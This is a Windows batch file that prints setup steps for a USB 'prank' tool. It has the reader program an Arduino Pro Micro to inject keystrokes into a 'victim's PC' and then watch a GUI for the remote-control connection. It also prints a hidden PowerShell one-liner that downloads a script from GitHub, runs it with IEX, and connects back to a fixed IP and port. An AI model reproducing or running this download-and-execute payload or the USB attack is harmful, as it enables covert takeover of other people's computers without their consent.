@echo off
color 0E
cls
echo.
echo ================================================
echo   REMOTE CONTROL - QUICK START
echo ================================================
echo.
echo Step 1: Setup Firewall (ONE TIME ONLY)
echo        Right-click: 1_SETUP_FIREWALL.bat
echo        Select: "Run as administrator"
echo.
echo Step 2: Start Server
echo        RECOMMENDED: 2_START_SERVER_GITHUB.bat (uses GitHub)
echo        Alternative: 2_START_SERVERS.bat (local web server)
echo.
echo Step 3: Program Pro Micro
echo        Arduino IDE -^> Open ProMicro_GitHub.ino
echo        Update IP (line 19): 192.168.8.158
echo        Upload to Pro Micro
echo.
echo Step 4: Execute Prank
echo        Plug Pro Micro into victim's PC
echo        Wait 3-5 seconds
echo        Remove Pro Micro
echo        Check GUI for connection!
echo.
echo ================================================
echo   MANUAL TEST (NO PRO MICRO)
echo ================================================
echo.
echo Press Win+R and paste this:
echo.
echo powershell -W Hidden -NoP -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
echo.
echo ================================================
echo.
echo Current Files:
echo   1_SETUP_FIREWALL.bat     ^<-- Run as Admin (once)
echo   2_START_SERVER_GITHUB.bat ^<-- Start GUI (GitHub mode)
echo   ProMicro_GitHub.ino      ^<-- Upload to Pro Micro
echo   PowerShellCommand.ps1    ^<-- Test commands
echo.
echo ================================================
echo.
pause
